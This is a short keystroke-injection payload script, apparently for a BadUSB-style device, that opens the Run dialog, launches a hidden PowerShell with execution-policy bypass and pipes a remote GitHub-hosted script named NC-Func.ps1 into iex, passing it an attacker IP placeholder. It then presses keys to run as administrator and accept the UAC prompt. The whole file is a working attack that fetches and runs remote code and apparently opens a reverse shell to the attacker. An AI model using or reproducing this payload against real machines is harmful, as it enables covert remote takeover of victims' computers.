
// Replace IP_HERE before running!

// script setup
layout("us")

// Open Powershell as Admin
press("GUI r");
delay(1000);
type("powershell -NoP -Ep Bypass -W H -C $ip='IP_HERE'; irm https://raw.githubusercontent.com/beigeworm/assets/main/Scripts/NC-Func.ps1 | iex");
delay(500);
press("CONTROL SHIFT ENTER");
delay(3000);
press("ALT y");
delay(4000);
